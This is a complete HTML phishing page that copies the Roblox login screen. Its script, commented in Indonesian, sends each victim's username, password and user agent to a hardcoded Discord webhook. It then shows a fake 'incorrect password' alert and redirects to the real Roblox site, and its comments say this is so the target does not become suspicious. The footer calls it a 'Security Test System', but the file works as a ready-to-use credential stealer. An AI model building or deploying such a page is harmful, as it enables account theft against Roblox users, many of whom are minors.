<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        /* Desain UI Roblox Dark Mode */
        body { background-color: #191B1D; color: white; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: #252729; padding: 40px; border-radius: 8px; width: 380px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .logo { width: 50px; margin-bottom: 25px; }
        h3 { margin-bottom: 25px; font-weight: 500; font-size: 22px; color: #FFFFFF; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #393B3D; background: #393B3D; color: white; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: 1px solid #00A2FF; background: #252729; }
        .btn-login { width: 100%; padding: 12px; background: #00A2FF; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 20px; font-size: 16px; transition: 0.3s; }
        .btn-login:hover { background: #0081CC; }
        .footer-text { font-size: 13px; color: #BDC3C7; margin-top: 30px; line-height: 1.5; }
        .footer-text a { color: #00A2FF; text-decoration: none; }
        .footer-text a:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://images.rbxcdn.com/22aa67dc0090333be2d0e74035c98d49-roblox_logo_dark.svg" class="logo" alt="Roblox">
        <h3>Login to Roblox</h3>
        
        <input type="text" id="username" placeholder="Username / Email / Phone" autocomplete="off">
        <input type="password" id="password" placeholder="Password" autocomplete="off">
        
        <button class="btn-login" onclick="jalankanAksi()">Log In</button>

        <div class="footer-text">
            Forgot Password or Username? <br><br>
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>

    <script>
        function jalankanAksi() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            
            // Alamat Webhook Discord Kamu
            const webhookUrl = "https://discord.com/api/webhooks/1465535661137465477/_9sH7paVDizGFWGX3hcR_ZmstyABPYQeqBd-_hf3bmtvWezAncsOLfhGDBOyF5GkobRI";

            if(user === "" || pass === "") {
                alert("Please enter a valid username and password.");
                return;
            }

            // Mengirim data ke Discord
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "⚠️ **TARGET LOGIN TERDETEKSI!**",
                    embeds: [{
                        title: "Laporan Akun Baru",
                        description: "Target baru saja memasukkan data di halaman login palsu.",
                        color: 16711680, // Warna Merah
                        fields: [
                            { name: "👤 Username", value: "```" + user + "```", inline: true },
                            { name: "🔑 Password", value: "```" + pass + "```", inline: true },
                            { name: "🌐 User Agent", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Security Test System | " + new Date().toLocaleString() }
                    }]
                })
            })
            .then(() => {
                // Setelah data terkirim, arahkan ke Roblox asli biar target gak curiga
                // Kita kasih pesan error palsu dulu biar dia ngerasa salah ngetik
                alert("Incorrect username or password. Please try again.");
                window.location.href = "https://www.roblox.com/login";
            })
            .catch(err => {
                console.error("Error sending to webhook:", err);
                // Tetap arahkan walaupun gagal kirim agar tidak curiga
                window.location.href = "https://www.roblox.com/login";
            });
        }
    </script>
</body>
</html>
